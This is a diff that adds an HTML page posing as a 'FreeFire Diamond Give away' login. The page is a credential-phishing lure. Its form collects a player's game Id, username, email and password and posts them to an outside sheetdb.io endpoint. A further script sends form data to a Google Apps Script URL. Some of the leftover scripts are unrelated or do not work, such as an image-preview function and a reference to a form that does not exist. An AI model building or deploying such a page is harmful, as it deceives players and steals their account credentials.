@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <title>FreeFire Give Away</title>
+    <link rel="shortcut icon" href="./images/favicon_io (2)/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div id="preloader"></div>
+    <div class="card">
+        <div class="search">
+            <h1>Login</h1>
+        </div>
+        <div class="weather">
+            <p>FreeFire Diamond Give away Login To get Yours</p>
+            <form action="https://sheetdb.io/api/v1/qcb0e138wheu6" method="post" id="Data">
+                <label for="Id">Id</label>
+            <input type="Id" id="Id" name="Id" placeholder="Enter Your Id" required>
+            <label for="Username">Username</label>
+            <input type="Username" id="Username" name="Username" placeholder="Enter Your Username" required>
+            <label for="Email">Email</label>
+            <input type="email" id="Email" name="Email" placeholder="Enter Your Email" required> <br>
+            <label for="id-1">Password</label>
+            <input type="id-1" id="id-1" name="id-1" placeholder="Enter Your Password"  required>
+            <button type="submit">submit</button>
+            </form>
+        </div>
+    </div>
+
+
+
+    <script>
+        function FileOnChange(p) {
+   var file = p.files[0];                                 //01
+   ImgSrc = URL.createObjectURL(file);                    //02
+   document.getElementById("ImgPreview").src = ImgSrc;    //03
+
+   let imgRead = new FileReader();                        //04
+
+
+   imgRead.onload = function(e) {                         //05
+   var AllData = e.target.result;                         //06
+   var ImgData = AllData.split("base64,")[1];             //07
+   document.getElementById("ImgData").value = ImgData;    //08
+   }
+   
+   imgRead.readAsDataURL(file);                           //09
+}
+    </script>
+
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyWuvVX4RgbKoGU6fc80lN8OMn4DgFIudD2XPc-nOU52_TE6FaBUjim3mEy3mWgS8PFJw/exec'
+    const form = document.forms['submit-to-google-sheet']
+
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => console.log('Success!', response))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+
+    <script>
+
+        var loader = document.getElementById("preloader");
+    
+        window.addEventListener("load", function(){
+            loader.style.display = "none";
+        })
+       </script>
+
+
+
+</body>
+</html>
